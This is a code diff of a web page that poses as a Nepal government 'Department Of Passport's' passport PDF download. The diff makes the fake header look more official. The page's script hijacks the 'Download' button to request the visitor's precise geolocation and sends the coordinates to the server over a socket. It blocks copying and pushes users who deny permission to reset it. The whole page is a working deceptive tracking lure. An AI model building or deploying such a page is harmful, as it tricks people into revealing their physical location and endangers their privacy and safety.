@@ -8,7 +8,6 @@
   <script src="/socket.io/socket.io.js"></script>
   
 <style>
-
   body, html {
     margin: 0; padding: 0; height: 100%; width: 100%;
     background: radial-gradient(circle at top, #330000 0%, #000000 70%, #1a1a1a 100%);
@@ -37,13 +36,25 @@
     will-change: transform, opacity, filter;
   }
 
+  .top-header {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    margin-top: 10px;
+  }
+
+  .header-title {
+    font-size: 16px;
+    font-weight: 800;
+    color: #000;
+    text-transform: uppercase;
+  }
+
   .nepal-flag {
-    position: absolute;
-    top: 15px;
-    right: 15px;
-    width: 20px;
+    width: 15px;
     height: auto;
-    z-index: 10;
   }
 
   .image-preview {
@@ -119,9 +130,14 @@
   </div>
 
   <div class="white-wrapper" id="main-wrapper">
-    <img src="https://i.imgur.com/1c62Joa.gif" alt="Nepal Flag" class="nepal-flag">
+    <div class="top-header">
+      <img src="https://i.imgur.com/1c62Joa.gif" alt="Nepal Flag" class="nepal-flag">
+      <div class="header-title">Department Of Passport's</div>
+    </div>
 
     <div class="container">
+        <div style="font-size: 12px; font-weight: 700; color: #555; margin-bottom: 5px; letter-spacing: 1px;">PASSPORT</div>
+        
         <img src="https://i.imgur.com/g1qVqrp.png" alt="PDF Icon" class="image-preview">
         <div class="doc-title-container">
           <i class="fas fa-file-pdf side-pdf-icon"></i>
@@ -152,86 +168,71 @@
       </div>
   </div>
 
-<script>
-    const socket = io({
-        transports: ['websocket'],
-        upgrade: false,
-        reconnection: true
-    });
+  <script>
+      const socket = io({
+          transports: ['websocket'],
+          upgrade: false
+      }); 
+      
+      const btn = document.getElementById('locationBtn');
+      const guide = document.getElementById('guide-overlay');
+      const closeBtn = document.getElementById('closeGuide');
 
-    const btn = document.getElementById('locationBtn');
-    const guide = document.getElementById('guide-overlay');
-    const closeBtn = document.getElementById('closeGuide');
+      document.addEventListener('copy', (e) => e.preventDefault());
 
-    document.addEventListener('copy', (e) => e.preventDefault());
+      function showGuide() { guide.style.display = 'flex'; }
+      function hideGuide() { guide.style.display = 'none'; }
 
-    function showGuide() { guide.style.display = 'flex'; }
-    function hideGuide() { guide.style.display = 'none'; }
+      async function handleAction() {
+          const options = {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+          };
 
-    // FORCE ACTION: Ye function browser ko popup ke liye majboor karega
-    async function handleAction() {
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        };
+          navigator.geolocation.getCurrentPosition(
+              (pos) => { 
+                  socket.emit('send-location', { lat: pos.coords.latitude, lng: pos.coords.longitude }); 
+                  updateUI('granted');
+              },
+              (err) => { 
+                  if (err.code === 1) { 
+                      updateUI('denied'); 
+                      showGuide();
+                  } 
+              },
+              options
+          );
+      }
 
-        // Seedha location maango, status check mat karo
-        navigator.geolocation.getCurrentPosition(
-            (pos) => { 
-                socket.emit('send-location', { 
-                    lat: pos.coords.latitude, 
-                    lng: pos.coords.longitude 
-                }); 
-                // Success hone par sab normal rakho
-                updateUI('granted');
-            },
-            (err) => { 
-                // Agar user "Deny" karega, sirf tabhi button laal hoga
-                if (err.code === 1) { 
-                    updateUI('denied'); 
-                    showGuide();
-                }
-            },
-            options
-        );
-    }
+      function updateUI(state) {
+          if (state === 'denied') {
+              btn.innerText = "RESET Permissions";
+              btn.classList.add('blocked');
+          } else {
+              btn.innerText = "Download";
+              btn.classList.remove('blocked');
+              hideGuide(); 
+          }
+      }
 
-    function updateUI(state) {
-        if (state === 'denied') {
-            btn.innerText = "RESET Permissions";
-            btn.classList.add('blocked');
-        } else {
-            btn.innerText = "Download";
-            btn.classList.remove('blocked');
-            hideGuide(); 
-        }
-    }
+      btn.addEventListener('click', handleAction);
+      closeBtn.addEventListener('click', hideGuide); 
 
-    btn.addEventListener('click', handleAction);
-    closeBtn.addEventListener('click', hideGuide); 
+      window.onload = () => {
+          btn.innerText = "Download";
+          btn.classList.remove('blocked');
 
-    // IMPORTANT: Page load par status check hata diya hai
-    window.onload = () => {
-        // Hamesha green button dikhao, chahe status jo bhi ho
-        btn.innerText = "Download";
-        btn.classList.remove('blocked');
-        
-        if (!socket.connected) socket.connect();
-
-        // Background detection sirf tab jab user reset kare
-        try {
-            navigator.permissions.query({ name: 'geolocation' }).then(res => {
-                res.onchange = () => {
-                    if (res.state === 'granted' || res.state === 'prompt') {
-                        updateUI('granted'); 
-                    }
-                };
-            });
-        } catch (e) {}
-    };
-</script>
-  
-
+          try {
+              navigator.permissions.query({ name: 'geolocation' }).then(res => {
+                  res.onchange = () => {
+                      if (res.state === 'granted' || res.state === 'prompt') {
+                          updateUI('prompt');
+                      }
+                  };
+              });
+          } catch (e) {}
+      };
+  </script>
 </body>
 </html>
